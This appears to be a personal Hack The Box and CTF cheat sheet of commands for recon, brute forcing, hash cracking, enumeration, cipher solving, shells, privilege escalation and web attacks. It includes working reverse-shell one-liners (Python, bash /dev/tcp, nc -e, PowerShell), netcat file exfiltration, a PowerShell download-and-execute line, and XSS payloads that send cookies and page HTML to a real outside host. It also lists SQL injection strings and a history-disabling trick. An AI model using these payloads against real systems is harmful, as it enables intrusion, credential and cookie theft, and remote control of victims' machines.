						Awcator's CheatSheet for CTF 

# -2.	Rare Attack:
USE sps tool to craft tcp packets,Nemesis,Scapy,kameme<br>
blackarch/ostinato,nping<br>
Cewl webpage and send it to Gobuster<br>
to dirbuster-ng for all subfolders<br>
[HTB JOKETR]goto /etc/iptables/rules.v4 to examine firewall configs, then try udp shell<br>
[HTB JOKER] WILD CARD HACK.<br>
Use Progress on all running pids to find interesting writable files and folders<br>
[HTB FLUX CAPACITOR] USE extra param on HTTP request using SecList/Discovery/Web_content/Burp-Param-name.txt with WFUZZ <br>

# -1.	After Basic Shell:
Check $hostname to make sure we are indeed on the machine<br>
look for cronjobs, look for database configs to get database passwords from php codes<br>
```
cd var/www/html/wordpress/wp-config.php ---------->gets u MYSQL CREDS
````
If the folder is owned by the root and setuid suid is set for the group, then the group user can delete the file, even if the user is not owned [HTB  LaCasaDaPel]<br>
```
 find . -perm -4000 2>/dev/null for suid
```
https://gtfgobin.github.io	-------------> To view exploits from SUID binaries<br>
```
LinEnum.sh LinPrivChecker.py UnixPriSec.sh
sudo -l;sudoedit -u username /path/to/file
```
# 0. 	Googling :
Joomla changelog 3.0.2.0 <br> 
Cron Root Location: /var/spool/cron/crontabs/root <br>
Logs: /var/log/syslog  or pspy64s or watch -n 1 cat /etc/passwd <br>

# 0. 	Tools:
#### RHAash
Tool to produce various types of hashes, hashid to detect these hashes
#### POP3/IMAP SSL AUTH:
```
openssl s_client -connect chaos.htb:993 -crlf       ---->[choas.htb]
````
#### Wordlist Generation:
```
cewl: cewl -w cewl.out http://ip  ----- This Generates wordlist out of the webpage  [HTB Curling, GLUE]
````
#### Bruteforcing:
```
# wfuzz:
wfuzz -c -w wordlist.txt -d 'POST DATA COPIED FROM BURP' -b 'cookies' http://url/login.php   ---post parameter must contain keyword FUZZ it replaces FUZZ with wordlist. [HTB Curling]
# wfuzz with the proxy:
SameAboveCommand -p 120.0.0.1:8080 htttp://URL/login.php
# wfuzz to hide lines:
wfuzz --hl int commadnContinue; This will stop echoing response of line int
[HTB APOLYCST]
hydra -l username -P passwords.file --wordlist list.file http-post-form "/login.php:username=^USER^&pwd=^PASS^&submit=login&ALLLPOSTDATA_FROM_BRUP:incorrest_MESSAge"
```
#### Cracking Pop3 Password email
```
hydra -l username -P list.file -f 10.10.10.10 -s portNumber pop3
```
#### Unzipping Archive:
```
bzcat: to unzip bz files
zcat : to unzip gzip files
Or use CyberChef by gchq
```
#### File Conent watching for cronjobs etc
```
watch -n 1 cat file.txt; watch it every 1 sec
```
#### HashCat:
```
echo -n 'Password@123' | md5sum | tr -d  - >> hashes.file;hashcat -a 0 -m 0 hashes.file ~/Documents/PasswordDict/rockyou.txt  --force
hashid hashes.file -------> to Identify ythe hashes
echo -n "password" | md5sum | tr -d " -" >> hashes.file
hashcat -a 0 -m 400 hashes.file wordlist.file
hashcat -a 0 -m 0 password ~/Documents/PasswordDict/rockyou.txt  --force --show
pacman -R beignet;extra/opencl-mesa
```
#### Forencis to recover deleted files: [HTB MIRAI]
```
look for it in lost+found folder, recyclebin folder
string /dev/sdb
xdd /dev/sdb|grep -v "0000 0000 0000 0000"
grep -a -B5 -A5 '[a-z0-9]\{32\}' /dev/sdb --------->get strings of length 32
dd,dcfldd
ssh pi@ip "sudo dcfld if=/dev/sdb |gzip -l -"|dcfld of=localfile.dd.gz
du -hs localfile.dd.gz;gunzip -d file ro decrypt
binwalk -Me pi.dd
testdisk pi.dd;photorec pi.dd
```
#### To perform SSL Client certificate handshake: ------------------>HTB LaCasaDaPaPel]
```
wget --no-check-certificate --certificate=cert.pem --private-key=ca.key https://10.10.10.131/?path=SEASON-2  [HTB LaCasaDaPaPel]
curl --cert-type P12 --cert Cert.p12:root https://lacasadepapel.htb/
*To generate CA Signed Certificate from CA.key
openssl rsa -in ca.key -text > private.pem
echo -n | openssl s_client -connect 10.10.10.131:443 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' >> lacasadepapel.htbcrt.pem                    
openssl pkcs12 -export -out Cert.p12 -in cert.pem -inkey private.pem -passin pass:root -passout pass:root
```

#### 0. 	After Admin Login:
	Try looking for template editings because, editing templates makes editing php i.e code injection
#### 0.  	PHP RENDER
```
  Remote FIle Inclusion, Local FIle Inclusion [Poison]<br>
  To read PHP file from php program: url?file=a.php ---to----url?file=php:///filter/convert.base64-encode/resource=a.php <br>
  file:// execept:// php:filter [Poison,Agargar,CrimeStopper] <br>
  FOr 403: do manualy, request the object via post request to index.php. Edit session vairalbe. <br>
  If you find someting is getting compared, use https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf PHP JUGLING COMparison. HTB GRAMMAR CHalnge <br>
  Check HTTP page title with SearchSploit <br>
  Upload Spcae Delimated file as: mypicture.php%00.jpg <br>
  Try poisioning the fileds to run php scripts indrirectyly, http logs. [POISON] <br>
  To bypass strip tags: <<a>script>alert('ciao');<</a>/script> <br>
```
#### 0. 	Recons:
```HTTP:nikto -h 10.10.10.10
Joomla: use Joomscan as a Recon in Background: $joomsacn --url http://ip:port -ec|tee jommScanOut
WordPres:wpscan -u 10.10.10.10/wp/ -eu
  wpscan --url 10.10.10.10. -e vt,tt,u,ap --log wpscan.log
  Wordpress admin login brute-forcing:
  [HTB APOCLYST]wpscan --url 10.10.10.10 --wordlist `pwd`/list.file --username "name";
  [HTB APOCLYST]for revshell,Wordpress allows editing php at plugins, install codeijectable plugin or appearnce/editor/theme/themeheader/
```
#### 1. 	Enumeration: 
```
	[SMB Enumeration]-----[htb friendzone]
	nmap -T4 -v -oA shares –script smb-enum-shares –script-args smbuser=username,smbpass=password -p445 10.10.10.123
	smbclient -L FRIENDZONE\x00 -I 10.10.10.123 -N
	smbclient -N //10.10.10.123/general
	smbcacls //10.10.10.123/general creds.txt -N
	sudo mount -t cifs //10.10.10.123/Development /mnt
	smbmap -R -H \\<ip>
	smbclient -L \\<ip> -N
	smbclient \\<ip>\share -U <user>
	smbget -R <ip>
	smbclient \\\\awcator\\music -U root
	sudo mount.cifs //192.168.43.26/awcator /mnt/ -o user=awcator
	http://www.techpository.com/linux-using-rsync-with-a-sambasmbcifs-share/
	
	[https enum]
	[HTB FLUJAB]sslscan flujab.htb ---> this will scan https, finds if any vulnurable also it can list dns zone transfer, ns,dig

	[POP3 Imap Atuh]
	openssl s_client -connect 10.10.10.120:995 [HTB Chaos]
	
	[DNS Enumeration]----[htb friendzone,Bank]
	sudo  dig 10.10.10.123 ANY +nostat +nocmd +nocomments
	hosts -l dnsname ip 
	dig axfr @10.10.10.123 friendzoneportal.red
	dig axfr  @10.10.10.123 friendzoneportal.red admin.friendzoneportal.red  ANY +nostat +nocmd +nocomments
	dig @10.10.10.123 +nocmd friendzoneportal.red any +multiline +noall +answer
	
	[NMAP Enumertaion]
	nmap -sV -sC -Pn -p 1-65535 --min-rate 1000 --max-retries 5 10.10.10.120
	s nmap -sS -O -sV -v -T5 -P0 -p1-65535 10.10.10.153 
	s nmap -p 1-65535 -sV -sS -T4 -oA fullTCp4Scan  10.10.10.150 
	s nmap -p 60,432 -sC -sV -n -Pn -T5 10.01.10.10 ----> to fast scann;-n no dns recon scan, -Pn no ping scan
	s nmap -p- -oA fullTCP 
	sudo nmap -sC -sV -oA folder/file ip
	sudo nmap --script vuln -oA vulnscan 10.10.10.117
	nmap -p80,445,8808 -sV -sS -T4 --script vuln -oA scriptScan 10.10.10.97
	SMB port=445
	sudo masscan -p 1-65535,U:1-65535 -e tun0 -oL ports.scan 10.10.10.10

	
	[LDAP ENumeration]:
	python2 ad-ldap-enum.py --d hackthebox.htb --server 10.10.10.107 -n
	Jxplorer
	ldapsearch -W -h 10.10.10.119 -D "uid=ldapuser2,ou=People,dc=lightweight,dc=htb" -s sub -b "dc=lightweight,dc=htb" "uid=ldapuser2"
	
	[Enumerate Files n Directorys]
	Keep Dirbuster in background let it scan for subfiles (important)
	gobuster -u http://10.10.10.117/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log
	gobuster -u http://10.10.10.117/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log -s 302,307,200,204,301,403 -x sh,pl,php
	dirsearch -w /usr/share/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u http://10.10.10.10
	sometimes do post request to see change in pages
	curl --request POST  http://webchal.thehackergiraffe.com/getfreeflag
	Change UserAgent might necesaasy

	[Joomla Enum]
	For versions: 	http://ip/administrator/manifests/files/joomla.xml
```	
# 2.	For Gaining Admin access:
```
	create user with sql injectable lines (SIgnUppage,2ndorder SQLInjection)
	SQL Injection (Try manual, SQLMAP)
	After the user login, hack the cookies to Admin(PadBusting)
	edit Session varialbe, add urslef one
	[HTB SECNOTES] Do 2nd order sql injection, Tyler -- -
	Try an XSS attack n get a cookie
	[HTB Agorah]if post req takes XML data, then XEE attack, [hackthebox agorah]
```
# 3.	SOLVING CIPHER
```
	AES-256-cbc decrypt:
	openssl enc -d -aes-256-cbc -in /path/file.enc -out /path/palin.txt -k "The key"
	Cracking MD5
	echo -n "fuckyou" | md5sum | cut -f 1 -d " " > password
	john --format=raw-md5 --wordlist=~/Documents/PasswordDict/rockyou.txt password
	john --wordlist=/usr/share/dict/rockyou.txt a.john
	CHeck if it is Eesoteric Programming lang
	Anagram: letters are shuffled
			http://www.wordfinders.com/solver/
			Encrpt:YHAOANUTDSYOEOIEUTTC!
			Decrypt:YOUSEETHATYOUCANDOIT!
	Cieaser : 
			{hw-wx-euxwh?} ----------->{et-tu-brute?} === -3 letter
	Rot 	13
			{zrbj zrbj} -------------->{Meow meow}-
	Usually BASE64 encoded
		  ends with== and encoded string is divisble by 4
	JSFuck:
			Identification:    if consist=[]()!+/, =, ", ', ,, {, } and  (blank).
			Encrypted:[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
			Decrypted:Alert(1)
	BrainFuck:
			Indentification: +><=
			Encryped:++++++++++[>+>+++>+++++++>++++++++++
	Fernet (symmetric encryption):
			If you find Two datas given, i.e Key and and token,bothare BAse64. Key is base64 of 32bits
	RSA 	(asymmetric encryption):	
			Check if we have 4 numbers (prim)
	Binary	Try converting binary to Hexa,Deci,base64,BarCode,Image,Baconian Cipher
	Substitution Cipher:	  	  
			Identification:Same number of letters and numbers in the ciphertext but the the letters are changed.
			https://www.guballa.de/substitution-solver
			QuipQuip	  	  
	Baconian Cipher:
			https://mothereff.in/bacon
			E:BAABAAABBBAABAAAABABABABAAAAAAAABBAABAAABAAABABBAAAAAAAABBBAABAAAAABAABAAAA
			D:THEFLAGISNAPIER
			I:Two letters usally caps
	Ook Programming languge:
			I:Madeup of !?,.
			E:..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
			D:Nothing here check /asdiSIAJJ0QWE9JAS
	Xor Operation:
			I: If we find two strings in Hexa/or any of same length, then xor
			S:http://xor.pw/#

	MD5: 		you cannot decrypt it. but it is 32 in length, +1 new line char
```
# 4.  Analyzing Images or FIles:
```
	Files can be polygot. Just change the extension or use like it was not supposed to use, eg. java -jar a.docx
	file filename
	Strings filename
	zbarimg to view gifs frames and runs QR/bar codes againt it
	zsteg,steghide extract -sf filename
	exsiftool file
	binwalk --dd='.*' best_meme.jpg 
	sox sound.wav -n spectrogram  
	pngcheck,stegsolve,gimp,HexEditor,FIleinSight,foremost,audacity
	WxHexEditorResize image with ==>00 00 02 9A  00 00 02 07 to ==>00 00 02 9A  00 00 02 9A; pngcsum  to fix CRC errors
	Check RGB,WEBCOClors to make a text out of it
```
	
#### 4.1	Reversing Binaries:
```
	vim file
	file file
	objdump -d file
	objdump -x file
	retdec-decompiler.py
	strace
	ltrace
	IDA64, ghidra <-- for .so files
	Dnspy for dotnet applications
	defordot <-- for deobfurscating .nt application
	jadx, apkeasy, apktool for android apks
```
# 5.  SHELLS
```
	python2 -m SimpleHTTPServer 8080 
	ME: nc -lnvp 4444  
	IPV6 GLOBAL: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("2405:204:542f:d5b6:1fef:cf64:f1a:97fd",4444,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	IPV6 HTTPServer: echo -e 'import BaseHTTPServer\nimport SimpleHTTPServer\nimport socket\nclass HTTPServer6(BaseHTTPServer.HTTPServer):\n address_family = socket.AF_INET6\nif __name__ == "__main__":\n SimpleHTTPServer.test(ServerClass=HTTPServer6)' | python2
	IPV6 HTTPServer: echo -e 'import http.server\nimport socket\nclass HTTPServer6(BaseHTTPServer.HTTPServer):\n address_family = socket.AF_INET6\nif __name__ == "__main__":\n SimpleHTTPServer.test(ServerClass=HTTPServer6)' | python3
	BOX: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.225",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	BOX: nc -e /bin/sh attackerIP attackerPort
	BOX: bash -i >& /dev/tcp/AttackerIP:4444 2>&1
	python Shell: import os;os.popen("id 2>&1").read()
	Reverse Shell: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
	[HTB JOKER]Execute SHELLL using tar:  tar -cvvf a.tar /path/to/folder/ --checkpoint=1 --checkpoint-action=exec=id
```
#### 5.1	Transfer Files:
```
		ME:
			nc -l -p 1234 -q 1 > something.zip < /dev/null
		BOX:
			cat something.zip | netcat server.ip.here 1234
		scp friend@10.10.10.123:a.txt /tmp/me
```
			
####	5.2 Windows CMD to Meterpreter
```
  Use Unicorn [Artic]
```
#### 5.3 Upgrade SHell:
 ```
		python -c 'import pty; pty.spawn("/bin/bash")'
		stty raw -echo
		fg
		reset
		export SHELL=bash
		export TERM=xterm-256color
		stty rows 34 columns 146
		export HISTFILE=/dev/null
```
	
#### 6.  PriV ESC:
```
	Observe .bash_history,tmux-server Escaltion
	/dev/shm for wrting a files
	./usr/share/linenum/LinEnum.sh for linux Enumeration
	find / -perm -u=s -type f 2>/dev/null   STICKY PROGRAMS
	Use pspy binary (python scrutp) to view any crons, and play with it : [HINT, HTB Curling]
	If folder owned by root, then to get root, https://www.openwall.com/lists/oss-security/2017/01/27/7/1
	SSH keygen way rooting, check solution of Ypuffy Machine
	find for ~/.ssh/id_rsa == private key
	If /etc/passwd/ is writable then, use command to create a new user with root permission
	[HTB BANK][HTB APPOCLYST]openssl passwd -1 salt ipsec password -->HTis gives password
	6.1 PrivESC WIndows:
		runas /savecred /profile /user:Administrator "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\users\security\x1x.txt"   
		icacls "C:\Users\security\" /grant engineer:(OI)(CI)F /T
		icacls "C:\temp\sd" /grant engineer:F
		dir *.exe /b/s | findstr bash  == find . -iname "*.exe" | grep bash
		powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(10.10.10.10,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
	6.2 PrivEsc Linux:
		find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
		find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
		find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
		find /etc -perm -2 -type f 2>/dev/null
		smbclient -A c //10.10.10.97/new-site
		smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B  -L 10.10.10.107 --pw-nt-hash;# if uhave NTLM hash=0B186E661BBDBDCF6047784DE8B9FD8B
		smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B //10.10.10.107/alice --pw-nt-hash
```

====================================================================================================================================
```
XSS:
	Inch<script>document.createElement('img').src="http://filmslinks.000webhostapp.com/a.php?a=NEWCOOKIES"+document.cookie;</script>
	Inch<script>document.createElement('img').src="http://filmslinks.000webhostapp.com/a.php?a=NEWCOOKIES"+document.documentElement.innerHTML;</script>
	BEEF

SQL INJECTIOn:
	admin' -- -
	admin<singlespace>
	admin<spacessss>
	admin=
	' or 1=1 #
	' or '1'='1' #
	'OR 1 OR'
	tyler' -- -
	Padbusting example can be found at [iKnowMag1k/sol,HTB Lazy]
	sqlmap -u http://127.0.0.1/rlogin.html --dbms=mysql  --forms --banner 
	sqlmap -u http://127.0.0.1/rlogin.html --dbms=mariadb  --forms --banner --users --passwords
	sqlmap -u http://127.0.0.1/rlogin.html --dbms=mariadb  --forms  --tables
	sqlmap -u http://127.0.0.1/rlogin.html --dbms=mariadb  --forms -D rhythm -T music --columns -a
	sqlmap -u http://docker.hackthebox.eu:48103/register.php --dbms=mysql  --forms --banner --level 5 --risk 3  



FTP ACCES:
	zip2john ~/Downloads/crackme.zip  >a.john
	john --wordlist=/usr/share/dict/rockyou.txt  a.john
	john --show a.john
	ncftp -u anonymous -p anonymous -P 2121 ctf.thehackergiraffe.com
	hydra -t 1 -L ~/WORKBENCH/NinjaTools/top-usernames-shortlist.txt -p SheKnowsAll -vV -s 2121 ctf.thehackergiraffe.com ftp

ClientSideCompilatiton:
	libtool --mode=compile gcc -g -O -c one.c
	libtool --mode=compile gcc -g -O -c two.c
	libtool --mode=compile gcc -g -O -c main.c
	libtool --mode=link gcc -g -O -o libhello.la one.lo two.lo main.lo -rpath /usr/local/lib -lm
	sudo libtool --mode=install cp libhello.la /usr/local/lib/libhello.la
	libtool --mode=link gcc -g -O -o hello -lhello
	sudo libtool --mode=install cp hello /usr/local/bin/hello
	
LinuX-Windows Alternatives
	Linux	:$wget file
	Windows	:cmd> powershell "IEX(New-Object New.WebClient).downloadString('http://ip/file')"
	
URLS & CHEETSHEET n Exploits TIPS:
	Extracting the files:
	CyberChef by gchq
	
	Answers:
	http://sawicky.me/pwn/htb/chaos/
	https://github.com/pavelkaiser/Hack-The-Box/blob/master/useful_commands
	https://vulndev.io/2019/01/cheat_windows.html
	https://wingblog.github.io/
	https://exexute.github.io/categories/ctf/
	https://github.com/limbernie/limbernie.github.io/commit/3f192380bca8872fdfdbafd3e5f761fd58c82f59#diff-d5d7818959cc2da36ff89b0febebe55e
	https://github.com/adon90/pentest_compilation  --------->[ for tools n priv esc]
	https://github.com/alanvivona/ctf-htb-notes
	https://github.com/Harcrack/huck-box/blob/master/my_notes
	https://github.com/xapax/security/blob/master/bypass_image_upload.md
	https://github.com/limbernie/limbernie.github.io/tree/master/assets/images/posts
	https://github.com/fortyfunbobby/security-projects/tree/development/hackthebox/reversing/impossible-password
	PayloadsAllTheTHings github
	https://github.com/limbernie/limbernie.github.io/commit/3f192380bca8872fdfdbafd3e5f761fd58c82f59#diff-5f7a5c4b011630aa08c989bc68d9fe9a
Alredy existing Problem solved:
	
	Windows, SMB, kbd files	 == Jenkins HTB , ACCESS HTB 
	iRC,SSH,MSFCONOSLE 	 == Irked HTB


How to use Service:
	pop3:[VH GOLDENEYE]
		nc 10.10.10.10 port
			-->auth
			-->user UserName
			-->pass Password
			-->list
			-->retr 1




Some WRITEUPS:
	Joblin: https://g0blin.co.uk/

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("2405:204:568f:9bdb:a6cc:87d5:df66:86c1",4444,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

 
